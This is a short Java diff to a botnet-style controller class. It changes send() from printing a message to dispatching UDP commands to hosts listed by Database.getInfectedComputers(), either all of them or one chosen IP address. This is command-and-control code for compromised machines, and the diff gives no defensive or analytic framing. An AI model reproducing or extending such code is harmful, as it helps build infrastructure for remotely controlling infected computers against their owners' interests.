@@ -1,10 +1,12 @@
 package controller;
 
 import java.io.IOException;
+import java.net.InetAddress;
 import java.util.ArrayList;
 
 import communication.TCPServer;
 import communication.UDP;
+import utils.Pair;
 
 public class Controller {
 	static ArrayList<Thread> Threads = new ArrayList<>();
@@ -32,7 +34,15 @@ public class Controller {
 	}
 
 	public static void send(String to_send, String string) {
-		System.out.println(to_send + " : " + string);
+
+		if (string.equals("ALL"))
+			for (Pair<InetAddress, Integer> ip_port : Database.getInfectedComputers())
+				udpSocket.sendUDP(to_send, ip_port.getKey(), ip_port.getValue());
+		else
+			for (Pair<InetAddress, Integer> ip_port : Database.getInfectedComputers())
+				if (ip_port.getKey().getHostAddress().equals(string))
+					udpSocket.sendUDP(to_send, ip_port.getKey(), ip_port.getValue());
+
 		return;
 	}
 }
